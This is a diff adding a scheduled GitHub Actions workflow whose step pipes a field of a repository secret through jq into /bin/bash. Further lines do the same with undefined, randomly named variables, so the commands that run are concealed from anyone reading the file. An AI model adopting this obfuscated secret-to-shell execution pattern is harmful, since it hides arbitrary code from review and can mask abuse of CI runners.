@@ -1,0 +1,24 @@
+name: qixiademuguangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qixiademuguangg
+        env:
+          ms01: ${{ secrets.ms01 }}
+        run: |
+          echo $ms01 | jq -r .ygqb02 | /bin/bash
+          echo $r5 | jq -r .yeg0 | /bin/bash
+          echo $y032 | jq -r .d14 | /bin/bash
+          echo $xcfa092 | jq -r .e78 | /bin/bash
+          echo $bpt064 | jq -r .wsxrr37389 | /bin/bash
+          echo $pabuv31993 | jq -r .ys64 | /bin/bash
+          echo $nklpn1 | jq -r .f1 | /bin/bash
+
